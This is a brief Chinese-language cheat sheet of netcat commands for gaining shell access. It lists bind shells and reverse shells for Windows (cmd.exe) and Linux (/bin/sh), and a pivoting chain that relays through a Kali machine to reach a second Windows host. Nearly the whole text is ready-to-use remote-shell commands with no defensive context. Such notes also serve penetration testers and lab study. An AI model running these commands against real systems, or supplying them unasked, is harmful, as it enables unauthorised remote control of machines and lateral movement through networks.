### 正向连接

目标监听一个port

		nc -l -p port -e cmd.exe //win
		nc -l -p port -e /bin/sh //linux

本机连接

		nc ip port
### 反向连接
本地监听一个端口

		nc -vv -l -p port
目标连接

		nc -e cmd.exe ip port //win
		nc -e /bin/sh ip port //linux

### 打洞(win)
用win1访问win2

	kali:  nc -lvp 4444
	windows2 : nc -lvp 4444 -e cmd.exe
	windows1 : nc -v kali-ip 4444 -c "nc -v win2-ip 4444"
有延迟，多按几次
linux 同理
